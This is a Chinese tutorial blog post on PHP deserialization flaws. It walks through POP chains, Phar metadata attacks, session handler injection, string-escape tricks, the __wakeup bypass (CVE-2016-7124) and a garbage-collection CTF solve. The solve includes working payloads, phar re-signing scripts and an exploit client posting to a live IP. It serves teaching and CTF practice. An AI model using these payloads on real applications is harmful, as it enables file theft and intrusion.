---
title: PHP反序列化
date: 2022-4-14 12:14:38
tags: 
- Web
- Security
- PHP
- 反序列化
categories: 
- web安全基础漏洞
---

## 一、基础知识

### 1.序列化

php中有这么一个函数--**serialize()**，将变量（除了 resource 之外的任何类型）转换为字符串，这有利于存储或传递 PHP 的值，同时不丢失其类型和结构。

```php
 serialize(mixed $value): string
```

变量的转换遵循一定的规则。例如，一个int类型，值为1的变量通过 `serialize()` 函数转换后，就变成了字符串：i:1;

```php
<?php
echo serialize(1);
?>
```

> Output:
>
> i:1;

更多规则可以参考下面这张表格。

| **Type** | **Definition**                                               |
| -------- | ------------------------------------------------------------ |
| String   | s:size:value; (String values are always in double quotes)    |
| Integer  | i:value;                                                     |
| Float    | d:value;                                                     |
| Boolean  | b:value; (does store '1' or '0')                             |
| Null     | N;                                                           |
| Array    | a:size:{key definition;value definition; (repeated per element) } |
| Object   | O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition; (repeated per property) } |

对象的序列化会稍微复杂一些，要注意访问控制修饰符

```php
<?php
class Test
{
    public $site = "tawnx.com";
    public $arr=[1,'2'];
    private $float = 114.514;
    protected $bool = false;
}

echo(serialize(new Test()));
?>
```

> Output:
>
> O:4:"Test":4:{s:4:"site";s:9:"tawnx.com";s:3:"arr";a:2:{i:0;i:1;i:1;s:1:"2";}s:11:"Testfloat";d:114.514;s:7:"*bool";b:0;}

上面输出的字符串不能直接拿来反序列化。因为序列化对象时，当访问控制修饰符(public、protected、private)不同，序列化后的属性名即property name也不同
**public** : 属性名不改变
**protected** : 会在属性名前添加 `空字符` `*` `空字符`，空字符可以用`\0`来表示，即变成 `\0*\0属性名`
**private** : 会在属性名前添加 `空字符` `类名` `空字符`，即 `\0类名\0属性名`
而实际使用过程中一般使用URL编码，`\0`就编码成了`%00`

### 2.反序列化

序列化之后，变量数据变为字符串，无法直接使用，这时候就需要反序列化。php中的反序列化函数是：**serialize()**，作用就是把字符串解析还原成对应的变量。

```php
unserialize(string $data, array $options = []): mixed
```

### 3.魔术方法

魔术方法是一种以`__`开头命名特殊的方法，当对对象执行某些操作时会覆盖 PHP 的默认操作。

| [__construct()](https://www.php.net/manual/zh/language.oop5.decon.php#object.construct) | 构造函数，具有构造函数的类会在每次创建新对象时先调用此方法。 |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| [__destruct()](https://www.php.net/manual/zh/language.oop5.decon.php#object.destruct) | 析构函数，在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 |
| [__call()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.call) | 在对象中调用一个不可访问方法时，[__call()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.call) 会被调用。 |
| [__callStatic()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.callstatic) | 在静态上下文(即类)中调用一个不可访问方法时，[__callStatic()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.callstatic) 会被调用。 |
| [__get()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.get) | 读取不可访问（protected 或 private）或不存在的属性的值时，[__get()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.get) 会被调用。 |
| [__set()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.set) | 在给不可访问（protected 或 private）或不存在的属性赋值时，[__set()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.set) 会被调用。 |
| [__isset()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset) | 当对不可访问（protected 或 private）或不存在的属性调用 [isset()](https://www.php.net/manual/zh/function.isset.php) 或 [empty()](https://www.php.net/manual/zh/function.empty.php) 时，[__isset()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset) 会被调用。 |
| [__unset()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset) | 当对不可访问（protected 或 private）或不存在的属性调用 [unset()](https://www.php.net/manual/zh/function.unset.php) 时，[__unset()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset) 会被调用。 |
| [__sleep()](https://www.php.net/manual/zh/language.oop5.magic.php#object.sleep) | 执行 [serialize()](https://www.php.net/manual/zh/function.serialize.php) 函数时，如果此方法存在，会先被调用，然后才执行序列化操作。 |
| [__wakeup()](https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup) | 执行 [unserialize()](https://www.php.net/manual/zh/function.unserialize.php) 函数时，如果此方法存在，会先被调用，然后才执行序列化操作。 |
| [__serialize()](https://www.php.net/manual/zh/language.oop5.magic.php#object.serialize) | [serialize()](https://www.php.net/manual/zh/function.serialize.php) 函数会检查类中是否存在一个魔术方法 [__serialize()](https://www.php.net/manual/zh/language.oop5.magic.php#object.serialize) 。如果存在，该方法将在任何序列化之前优先执行，且会忽略[__sleep()](https://www.php.net/manual/zh/language.oop5.magic.php#object.sleep)。 |
| [__unserialize()](https://www.php.net/manual/zh/language.oop5.magic.php#object.unserialize) | [unserialize()](https://www.php.net/manual/zh/function.unserialize.php) 会检查是否存在具有名为 [__unserialize()](https://www.php.net/manual/zh/language.oop5.magic.php#object.unserialize) 的魔术方法。如果有，会忽略 [__wakeup()](https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup)。此函数将会传递从 [__serialize()](https://www.php.net/manual/zh/language.oop5.magic.php#object.serialize) 返回的恢复数组。 |
| [__toString()](https://www.php.net/manual/zh/language.oop5.magic.php#object.tostring) | [__toString()](https://www.php.net/manual/zh/language.oop5.magic.php#object.tostring) 方法用于一个类被当成字符串时应怎样回应。例如 `echo $obj;` 应该显示些什么。 |
| [__invoke()](https://www.php.net/manual/zh/language.oop5.magic.php#object.invoke) | 当尝试以调用函数的方式调用一个对象时，[__invoke()](https://www.php.net/manual/zh/language.oop5.magic.php#object.invoke) 方法会被自动调用。 |
| [__set_state()](https://www.php.net/manual/zh/language.oop5.magic.php#object.set-state) | //不常见先不写                                               |
| [__clone()](https://www.php.net/manual/zh/language.oop5.cloning.php#object.clone) | //不常见先不写                                               |
| [__debugInfo()](https://www.php.net/manual/zh/language.oop5.magic.php#object.debuginfo) | //不常见先不写                                               |

#### [__construct()](https://www.php.net/manual/zh/language.oop5.decon.php#object.construct) 和 [__destruct()](https://www.php.net/manual/zh/language.oop5.decon.php#object.destruct)

```php
 __construct(mixed ...$values = ""): void
 __destruct(): void
<?php

class MyDestructableClass 
{
    function __construct() {
        print "In constructor\n";
    }

    function __destruct() {
        print "Destroying " . __CLASS__ . "\n";
    }
}

$obj = new MyDestructableClass();//创建对象，构造函数被调用

?>//脚本执行结束，析构函数被调用
```

> Output:
>
> In constructor
> Destroying MyDestructableClass

#### [__call()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.call) 和 [__callStatic()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.callstatic)

```php
public __call(string $name, array $arguments): mixed
public static __callStatic(string $name, array $arguments): mixed
<?php
class MethodTest 
{
    public function __call($name, $arguments) 
    {
        // 注意: $name 的值区分大小写
        echo "Calling object method '$name' "
             . implode(', ', $arguments). "\n";
    }

    public static function __callStatic($name, $arguments) 
    {
        // 注意: $name 的值区分大小写
        echo "Calling static method '$name' "
             . implode(', ', $arguments). "\n";
    }
}

$obj = new MethodTest;
$obj->runTest('in object context');

MethodTest::runTest('in static context');
?>
```

> Output:
>
> Calling object method 'runTest' in object context
> Calling static method 'runTest' in static context

#### [__get()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.get)、[__set()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.set)、[__isset()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset) 和 [__unset()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset)

```php
public __set(string $name, mixed $value): void
public __get(string $name): mixed
public __isset(string $name): bool
public __unset(string $name): void
```

因为 PHP 处理赋值运算的方式，[__set()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.set) 的返回值将被忽略。类似的, 在下面这样的链式赋值中，[__get()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.get) 不会被调用：`$a = $obj->b = 8; `

```php
<?php
class PropertyTest
{
    private $pri;
    protected $pro;

    public function __set($name, $value)
    {
        echo "Setting '$name' to '$value', calling __set()\n";
        $this->$name = $value;
    }

    public function __get($name)
    {
        echo "Getting '$name', calling __get()\n";
        return null;
    }

    public function __isset($name)
    {
        echo "Is '$name' set? calling __isset()\n";
        return isset($this->$name);
    }

    public function __unset($name)
    {
        echo "Unsetting '$name', calling __unset()\n";
        unset($this->$name);
    }
}

$obj = new PropertyTest;

$obj->pub = 2;  //call __set()
echo $obj->pro;  //call __get()
isset($obj->a);  //call __isset()
unset($obj->a);  //call __unset()

?>
```

> Output:
>
> Setting 'pub' to '2', calling __set()
> Getting 'pro', calling __get() 
> Is 'a' set? calling __isset() 
> Unsetting 'a', calling __unset()

#### [__sleep()](https://www.php.net/manual/zh/language.oop5.magic.php#object.sleep) 和 [__wakeup()](https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup)

```
public __sleep(): array
public __wakeup(): void
```

`__sleep()` 返回一个包含对象中所有应被序列化的变量名称的数组，可以用于清理不需要的数据成员。

```php
<?php
class Test
{
    protected $link;
    private $username, $password;
    
    
    public function __sleep()
    {
        echo "calling __sleep()\n";
        return array('username', 'password');
    }
    
    public function __wakeup()
    {
        echo "calling __wakeup()\n";
    }
}

$obj = new Test;
$ser = serialize($obj);  //调用__sleep(),数据成员只包含返回数组中存在的变量
echo $ser."\n";
unserialize($ser);  //调用__wakeup()

?>
```

> Output:
>
> calling __sleep()
> O:4:"Test":2:{s:14:"Testusername";N;s:14:"Testpassword";N;} 
> calling __wakeup()

#### [__serialize()](https://www.php.net/manual/zh/language.oop5.magic.php#object.serialize) 和 [__unserialize()](https://www.php.net/manual/zh/language.oop5.magic.php#object.unserialize)

```php
public __serialize(): array
public __unserialize(array $data): void
```

PHP 7.4.0及以上才有，用法同`__sleep()` 和 `__wakeup()`，只不过优先级更高，且调用后会忽略`__sleep()` 或 `__wakeup()`。

#### [__toString()](https://www.php.net/manual/zh/language.oop5.magic.php#object.tostring)

```php
public __toString(): string
<?php
class TestClass
{
    public $foo='Hello';

    public function __toString() {
        return $this->foo;
    }
}

$class = new TestClass;
echo $class;
?>
```

> Output:
>
> Hello

#### [__invoke()](https://www.php.net/manual/zh/language.oop5.magic.php#object.invoke)

```php
__invoke( ...$values): mixed
```

当对象作为函数调用时，调用的就是 `__invoke()`

```php
<?php
class CallableClass 
{
    function __invoke($para1,$para2) {
        var_dump(array($para1,$para2));
        return "called __invoke()";
    }
}
$obj = new CallableClass;
echo $obj("p1","p2");
?>
```

> Output:
>
> array(2) {
> [0] =>
> string(2) "p1"
> [1] =>
> string(2) "p2"
> }
> called __invoke()

## 二、反序列化POP链

在实战中，有时候需要通过控制反序列化的参数，调用一系列魔术方法才能实现我们的目的。

Example：

```php
<?php
//flag is in flag.php
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
} 
```

类Modifier中有一个append函数，它会调用include，从而使用php伪协议来读取文件。可以通过魔术方法__invoke调用append。而Modifier的__invoke又可以通过Test的__get调用...

调用顺序如下图

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-05/未命名-2.jpg)

接下来就可以给对应的变量赋值构造pop参数。成员函数不会被序列化，所以可以删除。

```php
<?php

class Modifier {
    protected  $var="php://filter/read=convert.base64-encode/resource=./flag.php";
}

class Show{
    public $source;
    public $str;
}

class Test{
    public $p;
}

$a=new Show();
$b=new Show();
$c=new Test();
$d=new Modifier();

//保护变量不能在外部赋值
//$d->var="php://filter/read=convert.base64-encode/resource=./flag.php";

$c->p=$d;
$b->str=$c;
$a->source=$b;

echo urlencode(serialize($a));
```

> Output:
>
> O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A59%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D.%2Fflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D

get方式传入pop参数，将所得到的内容进行base64解码即可得到flag

## 三、Phar反序列化

### Phar

phar是PHP里的一种打包文件，就像java中的jar或者macos中的app一样，不需要解压缩，可以直接访问内部的资源。

### Phar文件结构([description of the Phar file format](https://www.php.net/manual/en/phar.fileformat.php))

所有 Phar 档案都包含三到四个部分：

#### 1. a stub（存根）

Phar 的存根是一个简单的 PHP 文件。 Phar 存根的内容没有限制，除了要求它以 `__HALT_COMPILER();` 结尾。例如以下形式

```php
anything <?php balabala __HALT_COMPILER();
```

#### 2. a manifest describing the contents（描述内容的清单）

下列表格描述了Phar文件中manifest的组成，其中Meta-data是用来存储变量的，php在内部调用了 [serialize()](https://www.php.net/manual/en/function.serialize.php) 以便于存储。这里就是漏洞利用的关键点

| Size in bytes                         | Description                                                  |
| ------------------------------------- | ------------------------------------------------------------ |
| 4 bytes                               | Length of manifest in bytes (1 MB limit)                     |
| 4 bytes                               | Number of files in the Phar                                  |
| 2 bytes                               | API version of the Phar manifest (currently 1.0.0)           |
| 4 bytes                               | Global Phar bitmapped flags                                  |
| 4 bytes                               | Length of Phar alias                                         |
| ??                                    | Phar alias (length based on previous)                        |
| 4 bytes                               | Length of Phar metadata (`0` for none)                       |
| ??                                    | Serialized Phar Meta-data, stored in [serialize()](https://www.php.net/manual/en/function.serialize.php) format |
| at least 24 * number of entries bytes | entries for each file                                        |

#### 3. the file contents（文件内容）

被压缩的文件内容，此处略过

#### 4.[optional] a signature for verifying Phar integrity (phar file format only)（签名）

验证 Phar 完整性的签名（仅限 Phar 文件格式），此处略过

### 生成Phar文件

```php
<?php
    class TestObject {
    }
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER();"); //设置stub
    $o = new TestObject();
    $o -> data='tawnx';
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "testtext"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```

> 注意：
>
> 需要将 php.ini 中的 `phar.readonly` 设为 `0` 或 Off 才能生成phar文件。

运行后在运行目录下会生成一个phar文件，用hex编辑器打开

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-05/截屏2022-05-26-21.25.03.png)

php一大部分的文件系统函数在通过`phar://`伪协议解析phar文件时，都会将meta-data进行反序列化。

```php
<?php
class TestObject{
    function __destruct()
    {
        echo $this -> data;   // TODO: Implement __destruct() method.
    }
}
include('phar://phar.phar');
?>
```

> Output：
>
> tawnx

还可以将Phar伪造成其他格式的文件，来进行文件上传，此处就不详细说明了。

## 四、Session反序列化

### Session

`Session` 一般称为“会话控制“，简单来说就是是一种客户与网站/服务器更为安全的对话方式。一旦开启了 `session` 会话，便可以在网站的任何页面使用或保持这个会话，从而让访问者与网站之间建立了一种“对话”机制。`PHP session`可以看做是一个特殊的数组类型变量。

### PHP Session 的工作流程

如果开启了`php session` ，当开始一个会话时，PHP 会尝试从请求中查找会话 ID （通常通过会话 `cookie`），如果发现请求的`Cookies`、`Get`、`Post` 中不存在`session id`，PHP 就会自动调用`php_session_create_id` 函数创建一个新的会话，并且在`http response`中通过`set-cookie`头部发送给客户端保存，如下图：

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-05/截屏2022-05-28-下午4.22.08.png)

有时候浏览器用户设置会禁止 `cookie`，当在客户端`cookie`被禁用的情况下，php也可以自动将`session id`添加到url参数中以及`form`的`hidden`字段中，但这需要将`php.ini`中的`session.use_trans_sid`设为开启，也可以在运行时调用`ini_set`来设置这个配置项。

会话开始之后，PHP 就会将会话中的数据设置到 `$_SESSION` 变量中，如下述代码就是一个在 `$_SESSION` 变量中注册变量的例子：

```php
<?php
    session_start();
    $_SESSION['name'] = 'tawnx';
```

当 PHP 停止的时候，它会自动读取 `$_SESSION` 中的内容，并将其进行`序列化`， 然后发送给会话保存管理器来进行保存。

### Session反序列化

在学习 session 反序列化之前，我们需要了解php.ini中这几个参数的含义。

| Directive                       | 含义                                               |
| ------------------------------- | -------------------------------------------------- |
| session.save_handler            | session保存形式。默认为files                       |
| session.save_path               | session保存路径。                                  |
| session.serialize_handler       | session序列化存储所用处理器。默认为php             |
| session.upload_progress.cleanup | 一旦读取了所有POST数据，立即清除进度信息。默认开启 |
| session.upload_progress.enabled | 将上传文件的进度信息存在session中。默认开启。      |

在上述的配置中，`session.serialize_handler` 是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。

| 处理器                     | 对应的存储格式                                               |
| -------------------------- | ------------------------------------------------------------ |
| php                        | 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值          |
| php_binary                 | 键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值 |
| php_serialize (php>=5.5.4) | 经过 serialize() 函数反序列处理的数组                        |

```
<?php
    session_start();
    $_SESSION['name'] = 'tawnx';
?>
```

当 **session.serialize_handler=php** 时，session文件内容为： `name|s:5:"tawnx";`。这也是默认的方式

当 **session.serialize_handler=php_serialize** 时，session文件为： `a:1:{s:4:"name";s:5:"tawnx";}`

当 **session.serialize_handler=php_binary** 时，session文件内容为： `二进制长度names:5:"tawnx";`

当注册 Session 会话时序列化和反序列化使用的处理器不同，且数据经过精心构造，可能就会出现安全问题。

譬如当生成session文件时，使用**php_serialize**处理器，而解析时使用**php**处理器，且session参数可控，我们就可以构造session来达到一些目的。

```
$_SESSION['hello'] = '|O:8:"stdClass":0:{}';
```

上面的 $_SESSION 数据，在存储时如果使用的序列化处理器为 php_serialize，存储的格式如下:

```
a:1:{s:5:"hello";s:20:"|O:8:"stdClass":0:{}";}
```

在读取数据时如果用的反序列化处理器不是 php_serialize，而是 php 的话，因为php处理器会将｜前作为key，后面的值作为value。那么反序列化后的key就是 `a:1:{s:5:"hello";s:20:"` value就是一个stdClass对象

```
array(1) {
  ["a:1:{s:5:"hello";s:20:""]=>
  object(stdClass)#1 (0) {
  }
}
```

下面是一个例子：

```php
//foo1.php
<?php

    ini_set('session.serialize_handler', 'php_serialize');
    session_start();

    $_SESSION['skey'] = $_GET['test'];
// foo2.php
<?php

    session_start();
    
    class test {
        var $name;

        function __wakeup() {
            echo 'hi,';
        }
        function __destruct() {
            echo $this->name;
        }
    }
```

通过访问 `foo1.php` 并传入参数 `test=|O:4:%22test%22:1:{s:4:%22name%22;s:5:%22tawnx%22;}` ，会把session信息写入文件，然后访问 `foo2.php`，session中就生成了一个test对象。

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-05/截屏2022-05-27-下午11.23.48.png)

## 五、反序列化字符逃逸

### 替换修改后导致字符串变长

```php
<?php
function filter($str){
    return str_replace('cat', 'hack', $str);
}
class A{
    public $name='tawnx';
    public $pass='passwd';
}
$obj=new A();
$ser=filter(serialize($obj));
$a=unserialize($ser);
echo $a->pass;
?>
```

以上面代码为例，如何在不直接修改 `$pass` 值的情况下间接修改 `$pass` 的值。

例如我们现在只能修改name的值，如果直接修改name为 `";s:4:"pass";s:6:"hacker";}`，是不行的，序列化后保存了字符长度，会将它正常地读取为name的值。

但是如果我们通过filter让前面多出27位，`";s:4:"pass";s:6:"hacker";}`就能成功地被反序列化。

例如修改name的值为`catcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcat";s:4:"pass";s:6:"hacker";}`，长度为108，一共有27个cat

经过filter函数替换后，整个序列化字符串为 `O:1:"A":2:{s:4:"name";s:108:"hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:4:"pass";s:6:"hacker";}";s:4:"pass";s:6:"passwd";}`，27个cat变为了hack，字符长度多了27，多出来的字符替 代`";s:4:"pass";s:6:"hacker";}`被读取，然后`;}`之后的字符被忽略，完成一次反序列化，`$pass` 的值就被修改了。

```php
<?php
function filter($str){
    return str_replace('cat', 'hack', $str);
}
class A{
    public $name='catcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcat";s:4:"pass";s:6:"hacker";}';
    public $pass='passwd';
}
$obj=new A();
$ser=filter(serialize($obj));
$a=unserialize($ser);
echo $a->pass;
?>
```

> Output：
>
> hacker

### 替换修改后导致字符串变短

```php
<?php
function filter($str){
    return str_replace('cat', '', $str);
}
class A{
    public $name='tawnx';
    public $like='apple';
    public $pass='passwd';
}
$obj=new A();
$ser=filter(serialize($obj));
$a=unserialize($ser);
echo $a->pass;
?>
```

序列化后的文本是这样的 `O:1:"A":3:{s:4:"name";s:5:"tawnx";s:4:"like";s:5:"apple";s:4:"pass";s:6:"passwd";}`

name的值被替换，字符减少，但是读取的文本字数不变，就会继续向后读，把序列化函数生成的like数据给读取了，然后我们修改like的值，让它反序列化的时候使用的是我们自己设置的like

例如我们要让`";s:4:"like";s:5:"`被读取成name的值，因为这段文本是18位，就需要让name的值经过替换后少18位，然后like的值进行拼接。like的值可以修改为`;s:4:"like";s:5:"apple";s:4:"pass";s:6:"hacker";}`，整个序列化后的文本就是`O:1:"A":3:{s:4:"name";s:18:"";s:4:"like";s:49:";s:4:"like";s:5:"apple";s:4:"pass";s:6:"hacker";}";s:4:"pass";s:6:"passwd";}`。

```php
<?php
function filter($str){
    return str_replace('cat', '', $str);
}
class A{
    public $name='catcatcatcatcatcat';
    public $like=';s:4:"like";s:5:"apple";s:4:"pass";s:6:"hacker";}';
    public $pass='passwd';
}
$obj=new A();
$ser=filter(serialize($obj));
$a=unserialize($ser);
echo $a->pass;
?>
```

> Output：
>
> hacker

## 六、运用技巧

### 1. 绕过 `__wakeup()`(CVE-2016-7124)

#### 影响版本

PHP5 < 5.6.25
PHP7 < 7.0.10

#### 利用方式

当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过 `__wakeup` 的执行。例如将 `O:1:"A":2:{...` 中的2修改为比2大的数字。

```php
<?php

class A {
    public $mem1=1;
    public $mem2=2;
    function __wakeup()
    {
        echo 'calling __wakeup()'."\n";
    }
    function __destruct()
    {
        echo 'calling __destruct'."\n";
    }
}

//正常序列化文本,执行__wakeup()和__destruct()
unserialize('O:1:"A":2:{s:4:"mem1";i:1;s:4:"mem2";i:2;}');

//修改后文本,只执行__destruct()
unserialize('O:1:"A":4:{s:4:"mem1";i:1;s:4:"mem2";i:2;}');
```

> Output:
>
> calling __wakeup()
> calling __destruct
> calling __destruct

### 2. 配合GC机制

#### GC机制

GC机制是在PHP中使用引用计数和回收周期来自动管理内存对象的一种机制。当一个变量被设置为`NULL`，或者没有任何指针指向时，它就会被变成垃圾，被GC机制自动回收掉；那么当一个对象**没有了任何引用之后**，就会被回收，在回收过程中，就会自动调用对象中的 `__destruct()`

例如，当反序列化这一段文本时 `a:2:{i:0;O:3:"obj":0:{}i:0;i:1;}`，先会使数组的index 0，为一个对象，然后再讲int类型的1赋值到index 0上，对象没有了引用，接着被回收，进而触发析构函数。

#### 例题

```php
<META http-equiv="Content-Type" content="text/html; charset=utf-8" />
<?php
highlight_file(__FILE__);
class getflag {
    function __destruct() {
        echo getenv("FLAG");
    }
}

class A {
    public $config;
    function __destruct() {
        if ($this->config == 'w') {
            $data = $_POST[0];
            if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) {
                die("我知道你想干吗，我的建议是不要那样做。");
            }
            file_put_contents("./tmp/a.txt", $data);
        } else if ($this->config == 'r') {
            $data = $_POST[0];
            if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) {
                die("我知道你想干吗，我的建议是不要那样做。");
            }
            echo file_get_contents($data);
        }
    }
}
if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $_GET[0])) {
    die("我知道你想干吗，我的建议是不要那样做。");
}
unserialize($_GET[0]);
throw new Error("那么就从这里开始起航吧");
```

再php脚本的最后，有一个 `throw new Error` 语句，导致php脚本不能正常地退出，就不会调用`__destruct()`函数，此时可以考虑用GC回收机制来触发。

看下代码，最终的目的是调用getflag类的析构函数，直接get传入 `O:7:"getflag":0:{}` 是不行的，会被过滤。file_get_contents可以使用phar伪协议来反序列化，前面还有一个file_put_contents用来写入phar文件。但是写入的时候也要对数据进行过滤，这里可以通过传入数组绕过，也可以使用zip，gzip等对phar文件进行处理，处理后仍然能正常解析并且可以绕过过滤。

那么流程为：传入get参数，调用A的 `__destruct()`，先写入文件，再读取进行反序列化，这里调用getflag的 `__destruct()`。

第一步先要构造好phar文件

```php
<?php
class getflag {
}

$phar = new Phar("file.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER();"); //设置stub
$o[0] = new getflag();
$o[1] = null;
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "text"); //添加要压缩的文件
$phar->stopBuffering();
```

运行后会在当前目录生成一个phar文件，因为需要修改meta-data的内容，用文本编辑器打开，将index1改成index0，然后需要进行重新签名，这里用的 `Xenny` 的python脚本：

```python
import gzip
from hashlib import sha1

file = open("file.phar","rb").read()
text = file[:-28]  #读取开始到末尾除签名外内容
last = file[-8:]   #读取最后8位的GBMB和签名flag
new_file = text+sha1(text).digest() + last  #生成新的文件内容，主要是此时sha1正确了。
open("file_sign.phar","wb").write(new_file)
```

然后进行压缩，也是 `Xenny` 的python脚本：

```python
import requests
import gzip
import re

file = open("./file_sign.phar", "rb") #打开文件
file_out = gzip.open("./file_sign.zip", "wb+")#创建压缩文件对象
file_out.writelines(file)
file_out.close()
file.close()
```

然后读取压缩后的文件，上传至 `./tmp/a.txt`，然后使用phar协议读取进而进行反序列化

```php
<?php

class A {
    public $config;
}

function send_post($url, $post_data) {
 
    $postdata = http_build_query($post_data);
    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => 'Content-type:application/x-www-form-urlencoded',
            'content' => $postdata,
            'timeout' => 15 * 60 // 超时时间（单位:s）
        )
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
 
    return $result;
}

$posturl='http://1.14.71.254:28885?0=';

//第一次请求写入文件
$wri=new A();
$wri->config='w';
$get=urlencode(serialize($wri));
$post_data = array(
    '0' => file_get_contents('file_sign.zip')
);
send_post($posturl.$get,$post_data);

//第二次请求读取文件
$read=new A();
$read->config='r';
$get=urlencode(serialize($read));
$post_data = array(
    '0' => 'phar://./tmp/a.txt'
);
$res=send_post($posturl.$get,$post_data);
echo $res;
```

## 参考文章：

[PHP反序列化漏洞总结](https://johnfrod.top/安全/php反序列化漏洞总结/)

[CTF竞赛：原理+实践掌握(PHP反序列化和Session反序列化)](http://www.smatrix.org/forum/forum.php?mod=viewthread&tid=147)

[PHP unserialize反序列化漏洞](https://www.mi1k7ea.com/2019/01/01/PHP反序列化漏洞/)

[带你走进PHP session反序列化漏洞](https://xz.aliyun.com/t/6640)

[一篇文章带你深入理解漏洞之 PHP 反序列化漏洞](https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/)

[PHP session反序列化漏洞](https://www.mi1k7ea.com/2019/04/21/PHP-session反序列化漏洞/)

[从虎符线下CTF深入反序列化利用](https://guokeya.github.io/post/uxwHLckwx/)